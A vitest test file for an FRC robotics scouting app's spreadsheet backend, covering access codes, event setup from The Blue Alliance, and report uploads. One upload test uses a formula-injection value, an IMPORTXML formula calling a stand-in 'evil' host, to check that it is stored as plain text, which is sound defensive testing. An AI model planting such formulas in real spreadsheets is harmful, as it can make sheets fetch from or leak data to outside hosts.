import { beforeEach, describe, expect, it } from 'vitest';
import type { MatchReport, PitReport, ScriptResponse } from '../shared/contract';
import {
  createEvent,
  EVENT_TABS,
  handleRequest,
  METADATA_COLUMNS,
  refreshSchedule,
  REPORT_TABS,
  ScriptError,
  tbaKnowsEvent,
} from './logic';
import { MemoryPort, MemoryTba } from './memoryPort';

const ACCESS_CODE = 'team-code';
const NOW = new Date('2026-10-16T13:00:00Z');
const EVENT_SHEET = 'sheet-2026test';

let port: MemoryPort;

function send(body: unknown, secrets = { accessCode: ACCESS_CODE as string | null }): ScriptResponse {
  return handleRequest(typeof body === 'string' ? body : JSON.stringify(body), port, secrets, NOW);
}

function upload(...reports: unknown[]) {
  const response = send({ action: 'upload', accessCode: ACCESS_CODE, reports });
  if (!response.ok || !('outcomes' in response)) throw new Error(`Upload failed: ${JSON.stringify(response)}`);
  return response.outcomes;
}

function matchReport(overrides: Partial<MatchReport> = {}): MatchReport {
  return {
    id: 'r1',
    kind: 'match',
    eventKey: '2026test',
    scoutId: null,
    configVersion: 1,
    status: 'complete',
    voided: false,
    createdAt: '2026-10-16T12:00:00.000Z',
    updatedAt: '2026-10-16T12:05:00.000Z',
    answers: { tele_scored: 3 },
    matchNumber: 12,
    station: 'Blue 2',
    teamNumber: 578,
    ...overrides,
  };
}

function bundle() {
  const response = send({ action: 'event-bundle', accessCode: ACCESS_CODE });
  if (!response.ok || !('bundle' in response)) throw new Error(`No Event Bundle: ${JSON.stringify(response)}`);
  return response.bundle;
}

const matchRows = () => port.rows(EVENT_SHEET, REPORT_TABS.match);

beforeEach(() => {
  port = new MemoryPort();
  port.seasonTabs.set('Settings', [
    ['Setting', 'Value'],
    ['Current event', '2026test'],
  ]);
  port.seasonTabs.set('Events', [
    ['Event key', 'Event Sheet ID'],
    ['2026test', EVENT_SHEET],
  ]);
  port.eventSheets.set(EVENT_SHEET, new Map());
});

describe('access', () => {
  it('rejects a wrong access code', () => {
    expect(send({ action: 'upload', accessCode: 'guess', reports: [matchReport()] })).toEqual({
      ok: false,
      error: 'Wrong access code',
    });
    expect(port.eventSheets.get(EVENT_SHEET)!.size).toBe(0);
  });

  it('refuses everything until an Admin sets the ACCESS_CODE property', () => {
    const response = send({ action: 'upload', accessCode: '', reports: [] }, { accessCode: null });
    expect(response).toMatchObject({ ok: false, error: expect.stringContaining('ACCESS_CODE') });
  });

  it('rejects a body that is not JSON, and unknown actions', () => {
    expect(send('not json')).toMatchObject({ ok: false });
    expect(send({ action: 'delete-everything', accessCode: ACCESS_CODE })).toMatchObject({ ok: false });
  });
});

describe('Event Bundle', () => {
  it('names the current event from the Settings tab', () => {
    expect(send({ action: 'event-bundle', accessCode: ACCESS_CODE })).toEqual({
      ok: true,
      bundle: { eventKey: '2026test', teams: [], schedule: [], roster: [], coverage: [] },
    });
  });

  it('explains when no current event is set', () => {
    port.seasonTabs.set('Settings', [['Setting', 'Value']]);
    expect(send({ action: 'event-bundle', accessCode: ACCESS_CODE })).toMatchObject({
      ok: false,
      error: expect.stringContaining('No current event'),
    });
  });

  it('explains when the current event has no Event Sheet', () => {
    port.seasonTabs.set('Settings', [['Setting', 'Value'], ['Current event', '2026nope']]);
    expect(send({ action: 'event-bundle', accessCode: ACCESS_CODE })).toMatchObject({
      ok: false,
      error: expect.stringContaining("2026nope isn't in the Events tab"),
    });
  });

  it('carries the schedule and team list from the Event Sheet', () => {
    port.writeEventTab(EVENT_SHEET, EVENT_TABS.schedule, [
      ['Match', 'Red 1', 'Red 2', 'Red 3', 'Blue 1', 'Blue 2', 'Blue 3'],
      [2, 578, 1511, 3015, 3044, 5254, 6758],
      [1, 340, '174', 191, 1585, 3015, 578],
    ]);
    port.writeEventTab(EVENT_SHEET, EVENT_TABS.teams, [['Team'], [578], [340], [9999]]);

    expect(bundle()).toMatchObject({
      eventKey: '2026test',
      teams: [174, 191, 340, 578, 1511, 1585, 3015, 3044, 5254, 6758, 9999],
      schedule: [
        {
          matchNumber: 1,
          stations: { 'Red 1': 340, 'Red 2': 174, 'Red 3': 191, 'Blue 1': 1585, 'Blue 2': 3015, 'Blue 3': 578 },
        },
        {
          matchNumber: 2,
          stations: { 'Red 1': 578, 'Red 2': 1511, 'Red 3': 3015, 'Blue 1': 3044, 'Blue 2': 5254, 'Blue 3': 6758 },
        },
      ],
    });
  });

  it('reads a schedule typed in by hand: columns by header, blanks left out, junk rows skipped', () => {
    port.writeEventTab(EVENT_SHEET, EVENT_TABS.schedule, [
      ['Blue 1', 'Match', 'Red 1', 'Notes'],
      [578, 'P1', 1511, 'practice'],
      [3044, 1, '', ''],
      ['', '', '', 'break'],
    ]);

    expect(bundle().schedule).toEqual([{ matchNumber: 1, stations: { 'Blue 1': 3044 } }]);
  });
});

describe('Admin menu', () => {
  const tbaMatch = (level: string, number: number, red: string[], blue: string[]) => ({
    key: `2026nyro_${level}${number}`,
    comp_level: level,
    set_number: 1,
    match_number: number,
    alliances: { red: { team_keys: red }, blue: { team_keys: blue } },
  });

  let tba: MemoryTba;

  beforeEach(() => {
    port = new MemoryPort();
    tba = new MemoryTba();
    tba.responses.set('/event/2026nyro/simple', { key: '2026nyro', name: 'Finger Lakes Regional' });
    tba.responses.set('/event/2026nyro/teams/keys', ['frc578', 'frc1511', 'frc340', 'frc3015', 'frc174', 'frc191', 'frc578B']);
    tba.responses.set('/event/2026nyro/matches/simple', [
      tbaMatch('qm', 2, ['frc578', 'frc1511', 'frc3015'], ['frc340', 'frc174', 'frc191']),
      tbaMatch('sf', 1, ['frc578', 'frc1511', 'frc3015'], ['frc340', 'frc174', 'frc191']),
      tbaMatch('qm', 1, ['frc340', 'frc174', 'frc191'], ['frc578', 'frc578B', 'frc1511']),
      tbaMatch('f', 1, ['frc578', 'frc1511', 'frc3015'], ['frc340', 'frc174', 'frc191']),
    ]);
  });

  it('creates an event in one step: Event Sheet, Events row, schedule, team list and current event', () => {
    const message = createEvent(' 2026NYRO ', port, tba);

    expect(port.eventSheetNames).toEqual(new Map([['sheet-1', 'Scouting 2026nyro']]));
    expect(port.readSeasonTab('Events')).toEqual([
      ['Event key', 'Event Sheet ID'],
      ['2026nyro', 'sheet-1'],
    ]);
    expect(port.readSeasonTab('Settings')).toEqual([
      ['Setting', 'Value'],
      ['Current event', '2026nyro'],
    ]);
    expect(port.readEventTab('sheet-1', EVENT_TABS.teams)).toEqual([['Team'], [174], [191], [340], [578], [1511], [3015]]);
    expect(message).toContain('Fetched 6 teams');
    expect(message).toContain('Fetched 2 qualification matches');
  });

  it('puts only qualification matches in the Schedule tab, leaving letter-suffixed teams blank', () => {
    createEvent('2026nyro', port, tba);

    expect(port.readEventTab('sheet-1', EVENT_TABS.schedule)).toEqual([
      ['Match', 'Red 1', 'Red 2', 'Red 3', 'Blue 1', 'Blue 2', 'Blue 3'],
      [1, 340, 174, 191, 578, '', 1511],
      [2, 578, 1511, 3015, 340, 174, 191],
    ]);
  });

  it('serves what it created as the Event Bundle', () => {
    createEvent('2026nyro', port, tba);

    expect(bundle()).toMatchObject({
      eventKey: '2026nyro',
      teams: [174, 191, 340, 578, 1511, 3015],
      schedule: [{ matchNumber: 1, stations: { 'Red 1': 340, 'Blue 3': 1511 } }, { matchNumber: 2 }],
    });
    expect(bundle().schedule[0].stations).not.toHaveProperty('Blue 2');
  });

  it('keeps existing Settings and Events rows, and changes only the current event', () => {
    port.seasonTabs.set('Settings', [
      ['Setting', 'Value'],
      ['Current event', '2026old'],
      ['Something else', 'kept'],
    ]);
    port.seasonTabs.set('Events', [
      ['Event key', 'Event Sheet ID'],
      ['2026old', 'sheet-old'],
    ]);

    createEvent('2026nyro', port, tba);

    expect(port.readSeasonTab('Settings')).toEqual([
      ['Setting', 'Value'],
      ['Current event', '2026nyro'],
      ['Something else', 'kept'],
    ]);
    expect(port.readSeasonTab('Events')).toEqual([
      ['Event key', 'Event Sheet ID'],
      ['2026old', 'sheet-old'],
      ['2026nyro', 'sheet-1'],
    ]);
  });

  it('reuses the Event Sheet when the event already exists', () => {
    createEvent('2026nyro', port, tba);
    const message = createEvent('2026nyro', port, tba);

    expect(port.eventSheets.size).toBe(1);
    expect(port.readSeasonTab('Events')).toHaveLength(2);
    expect(message).toContain('reused');
  });

  it('refuses something that is not an event key', () => {
    expect(() => createEvent('Finger Lakes', port, tba)).toThrow(ScriptError);
    expect(port.eventSheets.size).toBe(0);
  });

  it('can tell whether TBA knows an event, so the menu can warn about typos', () => {
    expect(tbaKnowsEvent('2026nyro', tba)).toBe(true);
    expect(tbaKnowsEvent('2026nyor', tba)).toBe(false);
  });

  it('creates an event TBA has no schedule for, with empty tabs to fill in by hand', () => {
    const message = createEvent('2026scrim', port, tba);

    expect(port.readEventTab('sheet-1', EVENT_TABS.schedule)).toEqual([
      ['Match', 'Red 1', 'Red 2', 'Red 3', 'Blue 1', 'Blue 2', 'Blue 3'],
    ]);
    expect(port.readEventTab('sheet-1', EVENT_TABS.teams)).toEqual([['Team']]);
    expect(message).toContain('no qualification schedule yet');
  });

  it('refreshes the current event’s schedule once TBA publishes it', () => {
    tba.responses.delete('/event/2026nyro/matches/simple');
    createEvent('2026nyro', port, tba);
    expect(bundle().schedule).toEqual([]);

    tba.responses.set('/event/2026nyro/matches/simple', [tbaMatch('qm', 1, ['frc578'], ['frc340'])]);
    const message = refreshSchedule(port, tba);

    expect(message).toContain('Fetched 1 qualification matches');
    expect(bundle().schedule).toEqual([{ matchNumber: 1, stations: { 'Red 1': 578, 'Blue 1': 340 } }]);
  });

  it('never wipes a schedule typed in by hand when TBA has nothing', () => {
    createEvent('2026scrim', port, tba);
    port.writeEventTab('sheet-1', EVENT_TABS.schedule, [['Match', 'Red 1'], [1, 578]]);

    refreshSchedule(port, tba);

    expect(port.readEventTab('sheet-1', EVENT_TABS.schedule)).toEqual([['Match', 'Red 1'], [1, 578]]);
  });

  it('explains when there is no current event to refresh', () => {
    expect(() => refreshSchedule(port, tba)).toThrow(/No current event/);
  });
});

describe('uploading Reports', () => {
  it('writes the metadata columns, then one column per question code', () => {
    expect(upload(matchReport())).toEqual([{ reportId: 'r1', outcome: 'stored' }]);

    const [header] = port.readEventTab(EVENT_SHEET, REPORT_TABS.match);
    expect(header).toEqual([...METADATA_COLUMNS, 'tele_scored']);
    expect(matchRows()).toEqual([
      {
        'Report ID': 'r1',
        Event: '2026test',
        Kind: 'match',
        Match: 12,
        Station: 'Blue 2',
        Team: 578,
        'Scout ID': '',
        Scout: '',
        'Config version': 1,
        Void: false,
        Created: '2026-10-16T12:00:00.000Z',
        Updated: '2026-10-16T12:05:00.000Z',
        'Uploaded at': '2026-10-16T13:00:00.000Z',
        'Uploaded via': 'device',
        tele_scored: 3,
      },
    ]);
  });

  it('updates the existing row when the same Report is uploaded again', () => {
    upload(matchReport());
    upload(matchReport({ updatedAt: '2026-10-16T12:30:00.000Z', answers: { tele_scored: 5 } }));

    expect(matchRows()).toHaveLength(1);
    expect(matchRows()[0]).toMatchObject({ tele_scored: 5, Updated: '2026-10-16T12:30:00.000Z' });
  });

  it('adds a row for each different Report', () => {
    upload(matchReport({ id: 'r1' }), matchReport({ id: 'r2', station: 'Red 3' }));
    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r1', 'r2']);
  });

  it('appends new question columns and never removes or reorders existing ones', () => {
    upload(matchReport({ id: 'r1', answers: { tele_scored: 1, auto_moved: true } }));
    upload(matchReport({ id: 'r2', configVersion: 2, answers: { tele_scored: 2, end_actions: ['Park', 'Climb'] } }));

    const [header] = port.readEventTab(EVENT_SHEET, REPORT_TABS.match);
    expect(header.slice(METADATA_COLUMNS.length)).toEqual(['tele_scored', 'auto_moved', 'end_actions']);
    expect(matchRows()).toMatchObject([
      { tele_scored: 1, auto_moved: true, end_actions: '' },
      { tele_scored: 2, auto_moved: '', end_actions: 'Park, Climb' },
    ]);
  });

  it('clears the cell of an answer the Report no longer has', () => {
    upload(matchReport({ answers: { tele_scored: 1, notes: 'fast' } }));
    upload(matchReport({ answers: { tele_scored: 1 } }));
    expect(matchRows()[0].notes).toBe('');
  });

  it('stores text that looks like a formula as plain text', () => {
    upload(matchReport({ answers: { notes: '=IMPORTXML("http://evil", "//a")' } }));
    expect(matchRows()[0].notes).toBe(`'=IMPORTXML("http://evil", "//a")`);
  });

  it('routes Pit Reports to the Pit Reports tab', () => {
    const { matchNumber: _m, station: _s, ...base } = matchReport({ id: 'p1', teamNumber: 1511 });
    const pit: PitReport = { ...base, kind: 'pit' };

    upload(pit);

    expect(port.rows(EVENT_SHEET, REPORT_TABS.pit)).toMatchObject([{ 'Report ID': 'p1', Kind: 'pit', Match: '', Team: 1511 }]);
  });

  it('rejects a Report for an unknown event, and still stores the rest', () => {
    const outcomes = upload(matchReport({ id: 'r1', eventKey: '2026nope' }), matchReport({ id: 'r2' }));
    expect(outcomes).toEqual([
      { reportId: 'r1', outcome: 'rejected', reason: 'unknown event key "2026nope"' },
      { reportId: 'r2', outcome: 'stored' },
    ]);
    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r2']);
  });

  it('rejects Drafts and malformed Reports', () => {
    const outcomes = upload(
      matchReport({ id: 'd1', status: 'draft' }),
      matchReport({ id: 'b1', station: 'Green 1' as never }),
      matchReport({ id: 'b2', answers: { 'Bad Code': 1 } }),
      { nonsense: true },
    );
    expect(outcomes.map((o) => o.outcome)).toEqual(['rejected', 'rejected', 'rejected', 'rejected']);
    expect(port.eventSheets.get(EVENT_SHEET)!.size).toBe(0);
  });

  it('routes each Report to its own event’s Event Sheet', () => {
    port.seasonTabs.get('Events')!.push(['2026other', 'sheet-2026other']);
    port.eventSheets.set('sheet-2026other', new Map());

    upload(matchReport({ id: 'r1' }), matchReport({ id: 'r2', eventKey: '2026other' }));

    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r1']);
    expect(port.rows('sheet-2026other', REPORT_TABS.match).map((r) => r['Report ID'])).toEqual(['r2']);
  });
});
